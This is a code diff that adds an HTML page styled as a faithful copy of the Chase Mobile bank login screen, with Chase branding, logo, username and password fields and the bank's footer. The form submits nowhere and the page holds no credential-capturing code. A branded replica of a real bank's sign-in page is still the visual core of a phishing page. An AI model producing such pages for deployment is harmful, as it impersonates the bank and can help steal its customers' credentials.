@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+
+<html lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Chase Mobile Login</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
+<style data-purpose="custom-fonts">
+    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+    body {
+      font-family: 'Open Sans', sans-serif;
+    }
+  </style>
+<script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            chase: {
+              blue: '#0b5baf',
+              darkblue: '#005ebd',
+              red: '#bf163e',
+              gray: '#717171',
+              lightgray: '#f4f4f4',
+              text: '#333333',
+              link: '#005ebd',
+            }
+          }
+        }
+      }
+    }
+  </script>
+</head>
+<body class="bg-[#f4f4f4] min-h-screen flex flex-col antialiased">
+<!-- BEGIN: Background and Header -->
+<div class="relative w-full bg-cover bg-center" style="background-image: url('https://lh3.googleusercontent.com/aida-public/AB6AXuDWpnDE4HWyVJGeRMV8UOhHVLwhC_6015SygUq0yH4ZRS2ovMI4EyzPsJuDJb92KqmwFALjwZn2B38ZP2T-tIpie-gcrj_Y7sddG94rDvIvdXHMaLTC_3rmsYmGJPszt3h4Q3zDg7R3Aj2nSvgeb6knOBRWP1tVLl2hf7IT_wFlKadC8bYdhzHll8FWDIfss7aAPRhEdGl_u0L9LlaSiUq0391kJAYA_G9l9Y7UaGkwNJ47G8_tl3sERy037gJ7U6VCmC3hy7ISJng'); height: 75vh;">
+<!-- Gradient Overlay -->
+<div class="absolute inset-0 bg-gradient-to-b from-black/60 via-transparent to-black/20"></div>
+<header class="relative z-10 w-full pt-10 pb-6 flex justify-center">
+<img alt="Chase Logo" class="h-8" src="https://lh3.googleusercontent.com/aida-public/AB6AXuCi6-xeJglA3T_ofdSF-WMV61W2ZOjlr8BCzwysjQV3ctqs46X1gdyfsPEK8pdp8V9UMHH9WNs_hzjOof5Fhcsxw7Q9hOsZjap5wolHeXt6q4TK0xRFr3izFBxQdxgP7dJ0U1P1H4lICGrDa_TZpyIOhFPRujC3PGNGgRc4p4WNWPKt062bNQ0hHiBmSNLkejRRF0feIV4yyaaQvZXj_cX3KrD_3Tyvb2tDSMd1edJao4OVI7K5vIQ6xbM6PwFedme3MjOIVpGRjeI"/>
+</header>
+<!-- BEGIN: Login Form Container -->
+<main class="relative z-10 w-full px-4 flex justify-center mt-4">
+<div class="bg-white rounded-lg shadow-xl w-full max-w-md p-6 sm:p-8">
+<form action="#" method="POST">
+<!-- Username Field -->
+<div class="mb-4">
+<label class="block text-chase-red font-bold text-sm mb-1" for="username">Username</label>
+<input class="w-full border-0 border-b border-chase-red focus:ring-0 focus:border-chase-red px-0 py-2 text-gray-900 bg-transparent" id="username" name="username" placeholder="" type="text"/>
+<div class="flex items-center text-chase-red text-xs mt-1">
+<i class="fa-solid fa-triangle-exclamation mr-1"></i>
+<span>Enter your username.</span>
+</div>
+</div>
+<!-- Password Field -->
+<div class="mb-5 relative">
+<label class="block text-chase-red font-bold text-sm mb-1" for="password">Password</label>
+<input class="w-full border-0 border-b border-chase-red focus:ring-0 focus:border-chase-red px-0 py-2 text-gray-900 bg-transparent pr-12" id="password" name="password" placeholder="" type="password"/>
+<button class="absolute right-0 bottom-3 text-chase-blue font-semibold text-sm" type="button">Show</button>
+<div class="flex items-center text-chase-red text-xs mt-1">
+<i class="fa-solid fa-triangle-exclamation mr-1"></i>
+<span>Enter your password.</span>
+</div>
+</div>
+<!-- Checkboxes -->
+<div class="flex justify-between items-center mb-6">
+<label class="flex items-center cursor-pointer">
+<input class="form-checkbox h-5 w-5 text-chase-blue border-gray-400 rounded focus:ring-chase-blue" type="checkbox"/>
+<span class="ml-2 text-sm text-gray-600">Remember username</span>
+</label>
+<label class="flex items-center cursor-pointer">
+<input class="form-checkbox h-5 w-5 text-chase-blue border-gray-400 rounded focus:ring-chase-blue" type="checkbox"/>
+<span class="ml-2 text-sm text-gray-600">Use token</span>
+</label>
+</div>
+<!-- Sign In Button -->
+<button class="w-full bg-chase-darkblue hover:bg-blue-800 text-white font-semibold py-3 rounded text-lg mb-4" type="submit">
+            Sign in
+          </button>
+<!-- Or Divider -->
+<div class="relative flex items-center justify-center mb-4">
+<div class="border-t border-gray-300 w-full"></div>
+<span class="bg-white px-3 text-chase-blue text-sm">Or</span>
+<div class="border-t border-gray-300 w-full"></div>
+</div>
+<!-- Passwordless Sign In Button -->
+<button class="w-full bg-white border border-chase-blue text-chase-blue hover:bg-gray-50 font-semibold py-3 rounded text-lg mb-6" type="button">
+            Passwordless sign in
+          </button>
+<!-- Links -->
+<div class="flex flex-col space-y-4">
+<a class="text-chase-link text-sm flex items-center hover:underline" href="#">
+              Forgot username/password? <i class="fa-solid fa-chevron-right ml-2 text-xs"></i>
+</a>
+<a class="text-chase-link text-sm flex items-center hover:underline" href="#">
+              Not enrolled? Sign up now. <i class="fa-solid fa-chevron-right ml-2 text-xs"></i>
+</a>
+</div>
+</form>
+</div>
+</main>
+<!-- END: Login Form Container -->
+</div>
+<!-- END: Background and Header -->
+<!-- BEGIN: Footer -->
+<footer class="bg-[#f4f4f4] w-full pt-8 pb-6 px-4 flex-grow flex flex-col justify-end">
+<!-- Social Icons -->
+<div class="flex justify-center space-x-6 mb-6">
+<a class="text-gray-500 hover:text-gray-700 text-2xl" href="#"><i class="fa-brands fa-facebook-square"></i></a>
+<a class="text-gray-500 hover:text-gray-700 text-2xl" href="#"><i class="fa-brands fa-instagram"></i></a>
+<a class="text-gray-500 hover:text-gray-700 text-2xl" href="#"><i class="fa-brands fa-x-twitter"></i></a>
+<a class="text-gray-500 hover:text-gray-700 text-2xl" href="#"><i class="fa-brands fa-youtube"></i></a>
+<a class="text-gray-500 hover:text-gray-700 text-2xl" href="#"><i class="fa-brands fa-linkedin"></i></a>
+</div>
+<!-- Footer Links -->
+<div class="text-center text-sm text-gray-600 mb-6 px-4">
+<div class="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-2">
+<a class="hover:underline" href="#">Contact us</a>
+<a class="hover:underline" href="#">Privacy &amp; security</a>
+<a class="hover:underline" href="#">Terms of use</a>
+</div>
+<div class="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-2">
+<a class="hover:underline" href="#">Accessibility</a>
+<a class="hover:underline" href="#">SAFE Act: Chase Mortgage Loan Originators</a>
+</div>
+<div class="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-2">
+<a class="hover:underline" href="#">Fair Lending</a>
+<a class="hover:underline" href="#">About Chase</a>
+<a class="hover:underline" href="#">J.P. Morgan</a>
+</div>
+<div class="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-2">
+<a class="hover:underline" href="#">JPMorgan Chase &amp; Co.</a>
+<a class="hover:underline" href="#">Careers</a>
+<a class="hover:underline" href="#">Español</a>
+</div>
+<div class="flex flex-wrap justify-center gap-x-4 gap-y-2">
+<a class="hover:underline" href="#">Chase Canada</a>
+<a class="hover:underline" href="#">Site map</a>
+<span>Member FDIC</span>
+</div>
+</div>
+<!-- Equal Housing & Copyright -->
+<div class="text-center text-sm text-gray-600">
+<div class="flex items-center justify-center mb-2">
+<i class="fa-solid fa-house mr-1"></i>
+<span>Equal Housing Opportunity</span>
+</div>
+<p>© 2026 JPMorganChase</p>
+</div>
+</footer>
+<!-- END: Footer -->
+</body></html>
